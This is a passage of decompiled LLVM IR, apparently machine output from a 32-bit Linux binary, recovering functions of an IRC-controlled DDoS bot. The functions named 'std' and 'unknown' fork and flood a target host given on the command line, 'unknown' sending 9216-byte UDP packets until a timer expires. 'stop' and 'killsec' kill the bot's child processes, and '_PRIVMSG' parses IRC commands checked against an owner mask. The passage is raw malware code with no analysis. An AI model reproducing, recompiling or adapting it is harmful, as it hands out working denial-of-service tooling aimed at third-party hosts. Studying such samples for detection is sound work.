  store i32 %v1_80489d1, i32* @eax, align 4
  %v1_80489dd = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80489e2

dec_label_pc_80489e2:                             ; preds = %dec_label_pc_8048808, %dec_label_pc_80487ec, %dec_label_pc_8048796, %entry, %dec_label_pc_804899a
  %v0_80489ea = phi i32 [ 0, %dec_label_pc_8048808 ], [ %v3_80487fa, %dec_label_pc_80487ec ], [ %v4_80487de, %dec_label_pc_8048796 ], [ %v4_8048784, %entry ], [ %v1_80489dd, %dec_label_pc_804899a ]
  ret i32 %v0_80489ea

; uselistorder directives
  uselistorder i32 %v5_8048911, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_80488dd, { 1, 0 }
  uselistorder i32 %v4_8048830, { 3, 2, 4, 1, 0, 5, 6 }
  uselistorder i32 %v3_80487fa, { 1, 0 }
  uselistorder i32 %v4_80487de, { 1, 0 }
  uselistorder i32 %v4_8048784, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_80489e2, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804899a, { 1, 0 }
  uselistorder label %dec_label_pc_8048968, { 1, 0 }
  uselistorder label %dec_label_pc_8048931, { 1, 0 }
  uselistorder label %dec_label_pc_80488cf, { 1, 0 }
  uselistorder label %dec_label_pc_804884a, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v4_80489f1 = add i32 %arg2, -2
  %v9_80489f1 = sub i32 1, %arg2
  %v10_80489f1 = and i32 %v9_80489f1, %arg2
  %v11_80489f1 = icmp slt i32 %v10_80489f1, 0
  %v12_80489f1 = icmp eq i32 %v4_80489f1, 0
  %v13_80489f1 = icmp slt i32 %v4_80489f1, 0
  %v3_80489f5 = icmp eq i1 %v13_80489f1, %v11_80489f1
  %v4_80489f5 = icmp eq i1 %v12_80489f1, false
  %v5_80489f5 = and i1 %v4_80489f5, %v3_80489f5
  br i1 %v5_80489f5, label %dec_label_pc_8048a03, label %dec_label_pc_80489f7

dec_label_pc_80489f7:                             ; preds = %entry
  %v1_80489fe = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8048a03

dec_label_pc_8048a03:                             ; preds = %entry, %dec_label_pc_80489f7
  %v4_8048a1a = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048a29 = call i32 @__GI_time(i32* null)
  %v1_8048a34 = add i32 %arg3, 12
  %v1_8048a37 = inttoptr i32 %v1_8048a34 to i32*
  %v2_8048a37 = load i32, i32* %v1_8048a37, align 4
  %v1_8048a3c = call i32 @atol(i32 %v2_8048a37)
  %v1_8048a4a = call i32 @mfork(i32 %arg1)
  %v1_8048a4f = icmp eq i32 %v1_8048a4a, 0
  %v1_8048a51 = icmp eq i1 %v1_8048a4f, false
  br i1 %v1_8048a51, label %dec_label_pc_8048b57, label %dec_label_pc_8048a57

dec_label_pc_8048a57:                             ; preds = %dec_label_pc_8048a03
  %v1_8048a5a = add i32 %arg3, 4
  %v1_8048a5d = inttoptr i32 %v1_8048a5a to i32*
  %v2_8048a5d = load i32, i32* %v1_8048a5d, align 4
  %v1_8048a62 = call i32 @__GI_gethostbyname(i32 %v2_8048a5d)
  %v2_8048a6a = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_8048a8b = add i32 %v1_8048a62, 12
  %v2_8048a8b = inttoptr i32 %v1_8048a8b to i32*
  %v3_8048a8b = load i32, i32* %v2_8048a8b, align 4
  %v2_8048a93 = ptrtoint i32* %stack_var_-36 to i32
  %v1_8048a99 = add i32 %v1_8048a62, 16
  %v2_8048a99 = inttoptr i32 %v1_8048a99 to i32*
  %v3_8048a99 = load i32, i32* %v2_8048a99, align 4
  %v1_8048a9c = inttoptr i32 %v3_8048a99 to i32*
  %v2_8048a9c = load i32, i32* %v1_8048a9c, align 4
  %v4_8048aa9 = call i32 @bcopy(i32 %v2_8048a9c, i32 %v2_8048a93, i32 %v3_8048a8b)
  %v1_8048ab1 = add i32 %v1_8048a62, 8
  %v2_8048ab1 = inttoptr i32 %v1_8048ab1 to i32*
  %v3_8048ab1 = load i32, i32* %v2_8048ab1, align 4
  %v1_8048ab4 = urem i32 %v3_8048ab1, 65536
  store i32 %v1_8048ab4, i32* %stack_var_-40, align 4
  %v1_8048abe = add i32 %arg3, 8
  %v1_8048ac1 = inttoptr i32 %v1_8048abe to i32*
  %v2_8048ac1 = load i32, i32* %v1_8048ac1, align 4
  %v1_8048ac6 = call i32 @atol(i32 %v2_8048ac1)
  %v5_8048b2d = add i32 %v1_8048a3c, %v2_8048a29
  br label %dec_label_pc_8048ad9

dec_label_pc_8048ad9:                             ; preds = %dec_label_pc_8048b52, %dec_label_pc_8048a57
  %storemerge = phi i32 [ %v4_8048b52, %dec_label_pc_8048b52 ], [ 0, %dec_label_pc_8048a57 ]
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_8048b52, label %dec_label_pc_8048adf

dec_label_pc_8048adf:                             ; preds = %dec_label_pc_8048ad9
  %v5_8048afd = call i32 @__libc_send(i32 %v4_8048a1a, i32 ptrtoint ([4 x i8]* @global_var_805135b.262 to i32), i32 50, i32 0)
  %v4_8048b17 = call i32 @__libc_connect(i32 %v4_8048a1a, i32 %v2_8048a6a, i32 16)
  %v2_8048b23 = call i32 @__GI_time(i32* null)
  %v7_8048b30 = icmp ult i32 %v2_8048b23, %v5_8048b2d
  br i1 %v7_8048b30, label %dec_label_pc_8048b52, label %dec_label_pc_8048b34

dec_label_pc_8048b34:                             ; preds = %dec_label_pc_8048adf
  %v1_8048b3a = call i32 @__libc_close(i32 %v4_8048a1a)
  store i32 %v1_8048b3a, i32* @eax, align 4
  %v1_8048b46 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048b52

dec_label_pc_8048b52:                             ; preds = %dec_label_pc_8048b34, %dec_label_pc_8048adf, %dec_label_pc_8048ad9
  %stack_var_-8.0 = phi i32 [ %storemerge, %dec_label_pc_8048ad9 ], [ 0, %dec_label_pc_8048adf ], [ 0, %dec_label_pc_8048b34 ]
  %v4_8048b52 = add i32 %stack_var_-8.0, 1
  br label %dec_label_pc_8048ad9

dec_label_pc_8048b57:                             ; preds = %dec_label_pc_8048a03
  ret i32 %v1_8048a4a

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048a1a, { 0, 2, 1 }
  uselistorder i32 %v4_80489f1, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048a03, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b59 = load i32, i32* @ebp, align 4
  store i32 %v0_8048b59, i32* %stack_var_-4, align 4
  %v4_8048b59 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048b59, i32* @ebp, align 4
  %v4_8048b9d = icmp eq i32 %arg2, 0
  %v0_8048bfb12 = load i32, i32* @global_var_8053790.256, align 16
  %v10_8048c0014 = icmp eq i32 %v0_8048bfb12, 0
  br i1 %v10_8048c0014, label %dec_label_pc_8048c09, label %dec_label_pc_8048b6c

dec_label_pc_8048b6c:                             ; preds = %entry, %dec_label_pc_8048bf8
  %storemerge19 = phi i32 [ %v4_8048bf8, %dec_label_pc_8048bf8 ], [ 0, %entry ]
  %v2_8048b6f = mul i32 %storemerge19, 4
  %v0_8048b74 = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8048b79 = add i32 %v0_8048b74, %v2_8048b6f
  %v1_8048b7c = inttoptr i32 %v2_8048b79 to i32*
  %v2_8048b7c = load i32, i32* %v1_8048b7c, align 4
  %v1_8048b7e = icmp eq i32 %v2_8048b7c, 0
  br i1 %v1_8048b7e, label %dec_label_pc_8048bf8, label %dec_label_pc_8048b82

dec_label_pc_8048b82:                             ; preds = %dec_label_pc_8048b6c
  %v2_8048b92 = load i32, i32* %v1_8048b7c, align 4
  store i32 %v2_8048b92, i32* @ebx, align 4
  %v0_8048b94 = call i32 @__libc_getpid()
  %v0_8048b99 = load i32, i32* @ebx, align 4
  %v12_8048b99 = icmp eq i32 %v0_8048b99, %v0_8048b94
  br i1 %v12_8048b99, label %dec_label_pc_8048bf8, label %dec_label_pc_8048b9d

dec_label_pc_8048b9d:                             ; preds = %dec_label_pc_8048b82
  br i1 %v4_8048b9d, label %dec_label_pc_8048bd6, label %dec_label_pc_8048ba3

dec_label_pc_8048ba3:                             ; preds = %dec_label_pc_8048b9d
  %v0_8048bb5 = load i32, i32* @global_var_8055e28.263, align 8
  %v4_8048bd1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805135f.264 to i32), i32 %v0_8048bb5)
  br label %dec_label_pc_8048bd6

dec_label_pc_8048bd6:                             ; preds = %dec_label_pc_8048b9d, %dec_label_pc_8048ba3
  %v0_8048bde = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8048be3 = add i32 %v0_8048bde, %v2_8048b6f
  %v1_8048be6 = inttoptr i32 %v2_8048be3 to i32*
  %v2_8048be6 = load i32, i32* %v1_8048be6, align 4
  %v3_8048bf3 = call i32 @kill(i32 %v2_8048be6, i32 9)
  br label %dec_label_pc_8048bf8

dec_label_pc_8048bf8:                             ; preds = %dec_label_pc_8048b82, %dec_label_pc_8048b6c, %dec_label_pc_8048bd6
  %v4_8048bf8 = add i32 %storemerge19, 1
  %v0_8048bfb = load i32, i32* @global_var_8053790.256, align 16
  %v10_8048c00 = icmp ult i32 %v4_8048bf8, %v0_8048bfb
  br i1 %v10_8048c00, label %dec_label_pc_8048b6c, label %dec_label_pc_8048bfb.dec_label_pc_8048c09_crit_edge

dec_label_pc_8048bfb.dec_label_pc_8048c09_crit_edge: ; preds = %dec_label_pc_8048bf8
  br label %dec_label_pc_8048c09

dec_label_pc_8048c09:                             ; preds = %entry, %dec_label_pc_8048bfb.dec_label_pc_8048c09_crit_edge
  %v0_8048bfb.lcssa = phi i32 [ %v0_8048bfb, %dec_label_pc_8048bfb.dec_label_pc_8048c09_crit_edge ], [ 0, %entry ]
  ret i32 %v0_8048bfb.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048bf8, { 1, 0 }
  uselistorder i32 %v2_8048b6f, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8048c09, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048bd6, { 1, 0 }
  uselistorder label %dec_label_pc_8048b6c, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048c0f = load i32, i32* @ebp, align 4
  store i32 %v0_8048c0f, i32* %stack_var_-4, align 4
  %v4_8048c0f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048c0f, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8048c23 = call i32 @malloc(i32 9216)
  %v2_8048c32 = call i32 @__GI_time(i32* null)
  %v1_8048c40 = call i32 @mfork(i32 %arg2)
  store i32 %v1_8048c40, i32* @eax, align 4
  %v1_8048c45 = icmp eq i32 %v1_8048c40, 0
  %v1_8048c47 = icmp eq i1 %v1_8048c45, false
  br i1 %v1_8048c47, label %dec_label_pc_8048dab, label %dec_label_pc_8048c4d

dec_label_pc_8048c4d:                             ; preds = %entry
  %v12_8048c4d = icmp eq i32 %arg3, 2
  br i1 %v12_8048c4d, label %dec_label_pc_8048c5f, label %dec_label_pc_8048c53

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c4d
  %v1_8048c5a = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8048c5f

dec_label_pc_8048c5f:                             ; preds = %dec_label_pc_8048c4d, %dec_label_pc_8048c53
  %v1_8048c62 = add i32 %arg4, 8
  %v1_8048c65 = inttoptr i32 %v1_8048c62 to i32*
  %v2_8048c65 = load i32, i32* %v1_8048c65, align 4
  %v1_8048c6a = call i32 @atol(i32 %v2_8048c65)
  %v2_8048c72 = ptrtoint i32* %stack_var_-48 to i32
  store i32 0, i32* %stack_var_-48, align 4
  %v1_8048c93 = add i32 %arg4, 4
  %v1_8048c96 = inttoptr i32 %v1_8048c93 to i32*
  %v2_8048c96 = load i32, i32* %v1_8048c96, align 4
  %v3_8048ca2 = call i32 @host2ip(i32 %arg2, i32 %v2_8048c96)
  store i32 2, i32* %stack_var_-48, align 4
  %v0_8048cb8 = load i32, i32* @global_var_8055e28.263, align 8
  %v4_8048cd4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805137c.265 to i32), i32 %v0_8048cb8)
  store i32 %v4_8048cd4, i32* @eax, align 4
  %v5_8048d7e = add i32 %v1_8048c6a, %v2_8048c32
  %v2_8048d11 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_8048cd9

dec_label_pc_8048cd9:                             ; preds = %dec_label_pc_8048d8c, %dec_label_pc_8048c5f
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_8048c5f ], [ %v4_8048d8c, %dec_label_pc_8048d8c ]
  %v0_8048cd9 = call i32 @random()
  %v4_8048cfc = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_8048cfc, i32* @eax, align 4
  %v5_8048d04 = icmp slt i32 %v4_8048cfc, 0
  br i1 %v5_8048d04, label %dec_label_pc_8048d67, label %dec_label_pc_8048d0a

dec_label_pc_8048d0a:                             ; preds = %dec_label_pc_8048cd9
  store i32 1, i32* %stack_var_-32, align 4
  %v4_8048d26 = call i32 @ioctl(i32 %v4_8048cfc, i32 21537, i32 %v2_8048d11)
  %v7_8048d57 = call i32 @__libc_sendto(i32 %v4_8048cfc, i32 %v1_8048c23, i32 9216, i32 0, i32 %v2_8048c72, i32 16)
  %v1_8048d62 = call i32 @__libc_close(i32 %v4_8048cfc)
  store i32 %v1_8048d62, i32* @eax, align 4
  br label %dec_label_pc_8048d67

dec_label_pc_8048d67:                             ; preds = %dec_label_pc_8048cd9, %dec_label_pc_8048d0a
  %v7_8048d6b = icmp sgt i32 %stack_var_-24.0, 49
  br i1 %v7_8048d6b, label %dec_label_pc_8048d6d, label %dec_label_pc_8048d8c

dec_label_pc_8048d6d:                             ; preds = %dec_label_pc_8048d67
  %v2_8048d74 = call i32 @__GI_time(i32* null)
  store i32 %v5_8048d7e, i32* @eax, align 4
  %v7_8048d81 = icmp ult i32 %v2_8048d74, %v5_8048d7e
  %v1_8048d83 = icmp eq i1 %v7_8048d81, false
  br i1 %v1_8048d83, label %dec_label_pc_8048d94, label %dec_label_pc_8048d8c

dec_label_pc_8048d8c:                             ; preds = %dec_label_pc_8048d6d, %dec_label_pc_8048d67
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048d67 ], [ 0, %dec_label_pc_8048d6d ]
  %v4_8048d8c = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_8048cd9

dec_label_pc_8048d94:                             ; preds = %dec_label_pc_8048d6d
  %v1_8048d9a = call i32 @__libc_close(i32 %v4_8048cfc)
  store i32 %v1_8048d9a, i32* @eax, align 4
  %v1_8048da6 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048dab

dec_label_pc_8048dab:                             ; preds = %entry, %dec_label_pc_8048d94
  %v0_8048dac = phi i32 [ %v1_8048c40, %entry ], [ %v1_8048da6, %dec_label_pc_8048d94 ]
  ret i32 %v0_8048dac

; uselistorder directives
  uselistorder i32 %v4_8048cfc, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8048dab, { 1, 0 }
  uselistorder label %dec_label_pc_8048d67, { 1, 0 }
  uselistorder label %dec_label_pc_8048c5f, { 1, 0 }
}

define i32 @killsec(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048db3 = load i32, i32* bitcast ([6 x i8]** @global_var_8053424.267 to i32*), align 4
  %v4_8048dbf = inttoptr i32 %v0_8048db3 to i8*
  %v4_8048dc2 = call i32 @__GI_strcasecmp(i8* %v4_8048dbf, i32 %arg1)
  %v1_8048dc7 = icmp eq i32 %v4_8048dc2, 0
  %v1_8048dc9 = icmp eq i1 %v1_8048dc7, false
  br i1 %v1_8048dc9, label %dec_label_pc_8048ddf, label %dec_label_pc_8048dcb

dec_label_pc_8048dcb:                             ; preds = %entry
  %v3_8048dda = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_8048ddf

dec_label_pc_8048ddf:                             ; preds = %entry, %dec_label_pc_8048dcb
  %v0_8048de0 = phi i32 [ %v4_8048dc2, %entry ], [ %v3_8048dda, %dec_label_pc_8048dcb ]
  ret i32 %v0_8048de0

; uselistorder directives
  uselistorder label %dec_label_pc_8048ddf, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp62 = inttoptr i32 %arg3 to i8*
  %stack_var_-1104 = alloca i32, align 4
  br label %dec_label_pc_8048df8

dec_label_pc_8048df5:                             ; preds = %dec_label_pc_8048e1d
  %v4_8048df5 = add i32 %storemerge12, 1
  br label %dec_label_pc_8048df8

dec_label_pc_8048df8:                             ; preds = %entry, %dec_label_pc_8048df5
  %storemerge12 = phi i32 [ %v4_8048df5, %dec_label_pc_8048df5 ], [ 0, %entry ]
  %v3_8048e12 = call i32 @_strlen(i8* %tmp62)
  %v7_8048e19 = icmp ult i32 %storemerge12, %v3_8048e12
  %v1_8048e1b = icmp eq i1 %v7_8048e19, false
  %.pre = add i32 %storemerge12, %arg3
  br i1 %v1_8048e1b, label %dec_label_pc_8048df8.dec_label_pc_8048e2a_crit_edge, label %dec_label_pc_8048e1d

dec_label_pc_8048df8.dec_label_pc_8048e2a_crit_edge: ; preds = %dec_label_pc_8048df8
  %.pre22 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8048e2a

dec_label_pc_8048e1d:                             ; preds = %dec_label_pc_8048df8
  %v1_8048e23 = inttoptr i32 %.pre to i8*
  %v2_8048e23 = load i8, i8* %v1_8048e23, align 1
  %v7_8048e26 = icmp eq i8 %v2_8048e23, 32
  %v1_8048e28 = icmp eq i1 %v7_8048e26, false
  br i1 %v1_8048e28, label %dec_label_pc_8048df5, label %dec_label_pc_8048e2a

dec_label_pc_8048e2a:                             ; preds = %dec_label_pc_8048e1d, %dec_label_pc_8048df8.dec_label_pc_8048e2a_crit_edge
  %v1_8048e30.pre-phi = phi i8* [ %.pre22, %dec_label_pc_8048df8.dec_label_pc_8048e2a_crit_edge ], [ %v1_8048e23, %dec_label_pc_8048e1d ]
  store i8 0, i8* %v1_8048e30.pre-phi, align 1
  %v1_8048e3f = add i32 %.pre, 2
  %v5_8048e42 = inttoptr i32 %v1_8048e3f to i8*
  %v4_8048e54 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_8048e51

dec_label_pc_8048e4e:                             ; preds = %dec_label_pc_8048e76
  %v4_8048e4e = add i32 %storemerge11, 1
  br label %dec_label_pc_8048e51

dec_label_pc_8048e51:                             ; preds = %dec_label_pc_8048e2a, %dec_label_pc_8048e4e
  %storemerge11 = phi i32 [ %v4_8048e4e, %dec_label_pc_8048e4e ], [ 0, %dec_label_pc_8048e2a ]
  store i32 %v4_8048e54, i32* @edi, align 4
  %v3_8048e6b = call i32 @_strlen(i8* %arg2)
  %v7_8048e72 = icmp ult i32 %storemerge11, %v3_8048e6b
  %v1_8048e74 = icmp eq i1 %v7_8048e72, false
  %.pre23 = add i32 %storemerge11, %v4_8048e54
  br i1 %v1_8048e74, label %dec_label_pc_8048e51.dec_label_pc_8048e83_crit_edge, label %dec_label_pc_8048e76

dec_label_pc_8048e51.dec_label_pc_8048e83_crit_edge: ; preds = %dec_label_pc_8048e51
  %.pre30 = inttoptr i32 %.pre23 to i8*
  br label %dec_label_pc_8048e83

dec_label_pc_8048e76:                             ; preds = %dec_label_pc_8048e51
  %v1_8048e7c = inttoptr i32 %.pre23 to i8*
  %v2_8048e7c = load i8, i8* %v1_8048e7c, align 1
  %v10_8048e7f = icmp eq i8 %v2_8048e7c, 33
  %v1_8048e81 = icmp eq i1 %v10_8048e7f, false
  br i1 %v1_8048e81, label %dec_label_pc_8048e4e, label %dec_label_pc_8048e83

dec_label_pc_8048e83:                             ; preds = %dec_label_pc_8048e76, %dec_label_pc_8048e51.dec_label_pc_8048e83_crit_edge
  %v1_8048e89.pre-phi = phi i8* [ %.pre30, %dec_label_pc_8048e51.dec_label_pc_8048e83_crit_edge ], [ %v1_8048e7c, %dec_label_pc_8048e76 ]
  store i8 0, i8* %v1_8048e89.pre-phi, align 1
  %v2_8048e8f = load i8, i8* %v5_8048e42, align 1
  %v3_8048e8f = zext i8 %v2_8048e8f to i32
  %v10_8048e92 = icmp eq i8 %v2_8048e8f, 33
  %v1_8048e94 = icmp eq i1 %v10_8048e92, false
  br i1 %v1_8048e94, label %dec_label_pc_8049145, label %dec_label_pc_8048e9a

dec_label_pc_8048e9a:                             ; preds = %dec_label_pc_8048e83
  %v0_8048e9a = load i32, i32* @global_var_8055e28.263, align 8
  %v3_8048ea9 = call i32 @__GI_strcasecmp(i8* %tmp62, i32 %v0_8048e9a)
  %v1_8048eae = icmp eq i32 %v3_8048ea9, 0
  %v1_8048eb0 = icmp eq i1 %v1_8048eae, false
  br i1 %v1_8048eb0, label %dec_label_pc_8049145, label %dec_label_pc_8048eb6

dec_label_pc_8048eb6:                             ; preds = %dec_label_pc_8048e9a
  %v2_8048eb6 = ptrtoint i32* %stack_var_-1104 to i32
  %v3_8048ed0 = bitcast i32* %stack_var_-1104 to i8*
  %v4_8048ed0 = call i32 @__GI_memset(i8* %v3_8048ed0, i32 0, i32 1024)
  %v5_8048edc = add i32 %.pre, 3
  %v22_8048edc = inttoptr i32 %v5_8048edc to i8*
  br label %dec_label_pc_8048eeb

dec_label_pc_8048ee8:                             ; preds = %dec_label_pc_8048f10
  %v4_8048ee8 = add i32 %storemerge10, 1
  br label %dec_label_pc_8048eeb

dec_label_pc_8048eeb:                             ; preds = %dec_label_pc_8048eb6, %dec_label_pc_8048ee8
  %storemerge10 = phi i32 [ %v4_8048ee8, %dec_label_pc_8048ee8 ], [ 0, %dec_label_pc_8048eb6 ]
  %v3_8048f05 = call i32 @_strlen(i8* %v22_8048edc)
  %v7_8048f0c = icmp ult i32 %storemerge10, %v3_8048f05
  %v1_8048f0e = icmp eq i1 %v7_8048f0c, false
  %.pre31 = add i32 %storemerge10, %v5_8048edc
  br i1 %v1_8048f0e, label %dec_label_pc_8048eeb.dec_label_pc_8048f1d_crit_edge, label %dec_label_pc_8048f10

dec_label_pc_8048eeb.dec_label_pc_8048f1d_crit_edge: ; preds = %dec_label_pc_8048eeb
  %.pre38 = inttoptr i32 %.pre31 to i8*
  br label %dec_label_pc_8048f1d

dec_label_pc_8048f10:                             ; preds = %dec_label_pc_8048eeb
  %v1_8048f16 = inttoptr i32 %.pre31 to i8*
  %v2_8048f16 = load i8, i8* %v1_8048f16, align 1
  %v7_8048f19 = icmp eq i8 %v2_8048f16, 32
  %v1_8048f1b = icmp eq i1 %v7_8048f19, false
  br i1 %v1_8048f1b, label %dec_label_pc_8048ee8, label %dec_label_pc_8048f1d

dec_label_pc_8048f1d:                             ; preds = %dec_label_pc_8048f10, %dec_label_pc_8048eeb.dec_label_pc_8048f1d_crit_edge
  %v1_8048f23.pre-phi = phi i8* [ %.pre38, %dec_label_pc_8048eeb.dec_label_pc_8048f1d_crit_edge ], [ %v1_8048f16, %dec_label_pc_8048f10 ]
  store i8 0, i8* %v1_8048f23.pre-phi, align 1
  %v0_8048f26 = load i32, i32* @global_var_8055e10.268, align 16
  %v3_8048f35 = call i32 @strwildmatch(i8* %v22_8048edc, i32 %v0_8048f26)
  %v1_8048f3a = icmp eq i32 %v3_8048f35, 0
  %v1_8048f3c = icmp eq i1 %v1_8048f3a, false
  br i1 %v1_8048f3c, label %dec_label_pc_8049145, label %dec_label_pc_8048f42

dec_label_pc_8048f42:                             ; preds = %dec_label_pc_8048f1d
  %v1_8048f48 = add i32 %.pre31, 1
  %v5_8048f49 = inttoptr i32 %v1_8048f48 to i8*
  %v3_8048f63 = call i32 @_strlen(i8* %v5_8048f49)
  %v5_8048fa6109 = icmp sgt i32 %v3_8048f63, 0
  br i1 %v5_8048fa6109, label %dec_label_pc_8048f76, label %dec_label_pc_8048fc4.preheader

dec_label_pc_8048f76:                             ; preds = %dec_label_pc_8048f42, %dec_label_pc_8048f8a
  %v4_8048f76113 = phi i32 [ %v5_8048f9a, %dec_label_pc_8048f8a ], [ %v1_8048f48, %dec_label_pc_8048f42 ]
  %storemerge9112 = phi i32 [ %v4_8048f9d, %dec_label_pc_8048f8a ], [ 0, %dec_label_pc_8048f42 ]
  %stack_var_-24.0111 = phi i8* [ %v22_8048f9a, %dec_label_pc_8048f8a ], [ %v5_8048f49, %dec_label_pc_8048f42 ]
  %v2_8048f79 = load i8, i8* %stack_var_-24.0111, align 1
  %v7_8048f7c = icmp eq i8 %v2_8048f79, 32
  br i1 %v7_8048f7c, label %dec_label_pc_8048fc4.preheader, label %dec_label_pc_8048f80

dec_label_pc_8048f80:                             ; preds = %dec_label_pc_8048f76
  %v2_8048f83 = load i8, i8* %stack_var_-24.0111, align 1
  %v4_8048f86 = icmp eq i8 %v2_8048f83, 0
  br i1 %v4_8048f86, label %dec_label_pc_8048fc4.preheader, label %dec_label_pc_8048f8a

dec_label_pc_8048f8a:                             ; preds = %dec_label_pc_8048f80
  %v2_8048f90 = load i8, i8* %stack_var_-24.0111, align 1
  %v2_8048f93 = load i32, i32* @ebp, align 4
  %v4_8048f93 = add nsw i32 %storemerge9112, -1100
  %v5_8048f93 = add i32 %v4_8048f93, %v2_8048f93
  %v6_8048f93 = inttoptr i32 %v5_8048f93 to i8*
  store i8 %v2_8048f90, i8* %v6_8048f93, align 1
  %v5_8048f9a = add i32 %v4_8048f76113, 1
  %v22_8048f9a = inttoptr i32 %v5_8048f9a to i8*
  %v4_8048f9d = add nuw nsw i32 %storemerge9112, 1
  %v5_8048fa6 = icmp slt i32 %v4_8048f9d, %v3_8048f63
  br i1 %v5_8048fa6, label %dec_label_pc_8048f76, label %dec_label_pc_8048fc4.preheader

dec_label_pc_8048fc4.preheader:                   ; preds = %dec_label_pc_8048f76, %dec_label_pc_8048f80, %dec_label_pc_8048f8a, %dec_label_pc_8048f42
  %stack_var_-24.0.lcssa = phi i8* [ %v5_8048f49, %dec_label_pc_8048f42 ], [ %v22_8048f9a, %dec_label_pc_8048f8a ], [ %stack_var_-24.0111, %dec_label_pc_8048f80 ], [ %stack_var_-24.0111, %dec_label_pc_8048f76 ]
  %v4_8048f76.lcssa = phi i32 [ %v1_8048f48, %dec_label_pc_8048f42 ], [ %v5_8048f9a, %dec_label_pc_8048f8a ], [ %v4_8048f76113, %dec_label_pc_8048f80 ], [ %v4_8048f76113, %dec_label_pc_8048f76 ]
  br label %dec_label_pc_8048fc4

dec_label_pc_8048fb1:                             ; preds = %dec_label_pc_8048fc4
  %v6_8048fb4 = add i32 %storemerge8, %v4_8048f76.lcssa
  %v1_8048fb7 = inttoptr i32 %v6_8048fb4 to i8*
  %v2_8048fb7 = load i8, i8* %v1_8048fb7, align 1
  %v7_8048fba = icmp eq i8 %v2_8048fb7, 32
  %v1_8048fbc = icmp eq i1 %v7_8048fba, false
  br i1 %v1_8048fbc, label %dec_label_pc_8048fc1, label %dec_label_pc_8048fbe

dec_label_pc_8048fbe:                             ; preds = %dec_label_pc_8048fb1
  %v4_8048fbe = add i32 %stack_var_-20.1, 1
  br label %dec_label_pc_8048fc1

dec_label_pc_8048fc1:                             ; preds = %dec_label_pc_8048fb1, %dec_label_pc_8048fbe
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1, %dec_label_pc_8048fb1 ], [ %v4_8048fbe, %dec_label_pc_8048fbe ]
  %v4_8048fc1 = add i32 %storemerge8, 1
  br label %dec_label_pc_8048fc4

dec_label_pc_8048fc4:                             ; preds = %dec_label_pc_8048fc4.preheader, %dec_label_pc_8048fc1
  %stack_var_-20.1 = phi i32 [ %stack_var_-20.0, %dec_label_pc_8048fc1 ], [ 0, %dec_label_pc_8048fc4.preheader ]
  %storemerge8 = phi i32 [ %v4_8048fc1, %dec_label_pc_8048fc1 ], [ 0, %dec_label_pc_8048fc4.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v4_8048f76.lcssa, i32* @edi, align 4
  %v3_8048fde = call i32 @_strlen(i8* %stack_var_-24.0.lcssa)
  %v7_8048fe5 = icmp ult i32 %storemerge8, %v3_8048fde
  br i1 %v7_8048fe5, label %dec_label_pc_8048fb1, label %dec_label_pc_8048fe9

